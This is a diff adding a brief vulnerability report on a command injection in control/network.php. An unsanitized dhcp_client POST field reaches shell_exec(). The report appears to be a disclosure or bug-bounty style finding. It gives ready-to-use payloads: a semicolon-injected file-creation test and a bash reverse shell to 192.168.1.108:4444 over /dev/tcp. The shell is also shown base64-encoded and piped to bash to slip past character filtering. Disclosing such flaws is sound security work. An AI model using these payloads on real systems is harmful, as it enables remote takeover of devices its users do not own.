@@ -1,0 +1,13 @@
+Command Injection in control/network.php
+
+The shell_exec() function that run dhcp_config.sh can be escape because of unsanitized form.
+User can put ';' at the end of dhcp_client value in POST request to network.php. All the following after ';'
+will be execute has bash command.
+
+This can lead to RCE.
+
+Fun payload: 
+  create file: "; touch /tmp/rce_found"
+  reverse shell(base 64 encoded to remove '&'): 
+  "; bash -i 5<> /dev/tcp/192.168.1.108/4444 0<&5 1>&5 2>&5" with base64 encode -> "; echo YmFzaCAtaSA1PD4gL2Rldi90Y3AvMTkyLjE2OC4xLjEwOC80NDQ0IDA8JjUgMT4mNSAyPiY1 | base64 -d | bash"
+
